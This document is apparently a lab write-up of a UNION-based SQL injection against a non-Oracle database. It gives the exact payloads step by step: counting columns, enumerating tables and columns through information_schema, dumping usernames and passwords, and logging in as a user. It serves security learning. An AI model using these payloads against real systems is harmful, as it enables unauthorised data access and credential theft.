# SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases

> # (1)To know the existing columns: 'ORDER BY 3--. Here 2 columns available
![image](https://user-images.githubusercontent.com/59218362/208476549-b40cdd56-df00-4681-a958-54a093025ed9.png)
![image](https://user-images.githubusercontent.com/59218362/208476733-22483735-1286-41e0-ac91-a76ce976a663.png)

> # (2) To check which column are retrieving data: 'UNION SELECT 'Data','Data'--. Here, both column are retrieve data
![image](https://user-images.githubusercontent.com/59218362/208477336-fcde6832-f402-497f-8729-d8593209df14.png)

> # (3) To know all table name: 'UNION SELECT NULL,table_name FROM information_schema.tables—
![image](https://user-images.githubusercontent.com/59218362/208478333-c92a1fb3-4bf1-467b-935a-37f25b2519e7.png)

> # (4)To know the column name from the user table: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_aqgopn'--
![image](https://user-images.githubusercontent.com/59218362/208482817-d0d7005d-a384-496a-bed8-1def3f6dbc92.png)

> # (5) Finally to get the credential: 'UNION SELECT username_srwnte, password_vbrkvq FROM users_aqgopn--
![image](https://user-images.githubusercontent.com/59218362/208484286-fc6c3460-ff6c-4f2a-b95e-755a74f09b9c.png)

> # (6) Login with credential
